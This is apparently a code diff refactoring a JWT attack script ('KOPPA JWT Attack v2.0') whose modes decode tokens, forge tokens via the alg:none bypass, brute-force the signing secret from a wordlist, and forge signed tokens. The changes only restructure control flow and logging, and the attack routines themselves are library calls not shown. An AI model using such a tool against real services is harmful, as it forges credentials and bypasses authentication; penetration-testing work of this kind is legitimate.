@@ -14,7 +14,7 @@ fn cmd_decode(token) {
 fn cmd_alg_none(token) {
     log.info("===== alg:none Bypass =====")
     let forged = jwt.none_alg(token)
-    log.success("[+] Forged token:\n{forged}")
+    log.success("[+] Forged token: {forged}")
     return forged
 }
 
@@ -25,7 +25,8 @@ fn cmd_crack(token) {
     let result = jwt.crack(token, wordlist)
     if result {
         log.success("[+] Secret found: {result}")
-    } else {
+    }
+    if not result {
         log.warn("[-] Secret not found in wordlist")
     }
     return result
@@ -39,29 +40,27 @@ fn cmd_forge(secret) {
     return forged
 }
 
-fn main() {
-    let token = __args__[0]
-    let mode  = __args__[1]
-
-    if not token {
-        log.warn("Usage: koppa run koppa-jwt-attack <token> [decode|alg-none|crack|forge]")
-        return
-    }
-
+fn run_attack(token, mode) {
     log.info("===== KOPPA JWT Attack v2.0 =====")
-
     if mode == "decode"   { cmd_decode(token) }
     if mode == "alg-none" { cmd_alg_none(token) }
     if mode == "crack"    { cmd_crack(token) }
     if mode == "forge"    { cmd_forge(token) }
-
     if not mode {
         cmd_decode(token)
-        log.info("")
         cmd_alg_none(token)
-        log.info("")
         cmd_crack(token)
     }
-
     log.success("JWT attack complete!")
+}
+
+fn main() {
+    let token = __args__[0]
+    let mode  = __args__[1]
+    if token {
+        run_attack(token, mode)
+    }
+    if not token {
+        log.warn("Usage: koppa run koppa-jwt-attack <token> [decode|alg-none|crack|forge]")
+    }
 }
